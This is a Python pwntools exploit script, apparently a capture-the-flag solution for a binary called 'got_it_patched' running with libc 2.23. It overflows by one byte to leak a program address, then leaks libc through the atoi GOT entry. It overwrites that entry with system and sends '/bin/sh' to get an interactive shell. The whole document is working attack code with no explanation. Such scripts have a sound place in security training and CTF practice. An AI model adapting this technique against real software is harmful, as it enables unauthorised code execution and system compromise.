from pwn import *

io = process("./got_it_patched")
#io = remote("xxx.xx.xxx.xxx", xxxx)
libc = ELF("./libc-2.23.so")

def show(idx):
    io.sendafter(b"> ", b'1')
    io.sendafter(b"which? ", str(idx).encode())
    io.recvuntil(b"website: ")
    content = io.recvuntil(b'\n', drop=True)
    print(b"content = " + content)
    return content

def edit(idx, content):
    io.sendafter(b"> ", b'2')
    io.sendafter(b"which? ", str(idx).encode())
    io.sendafter(b"your new website: ", content)

edit(4, b'a' * 0x10 + p8(0xe0))
elf_addr = u64(show(4)[0x10:].ljust(8, b'\x00')) - 0x36e0
print("elf_addr = " + hex(elf_addr))

edit(0, p64(elf_addr + 0x3640))
libc.address = u64(show(0).ljust(8, b'\x00')) - libc.symbols["atoi"]
print("libc.address = " + hex(libc.address))

edit(0, p64(libc.symbols["system"]))

io.sendafter(b"> ", b"/bin/sh\x00")

io.interactive()
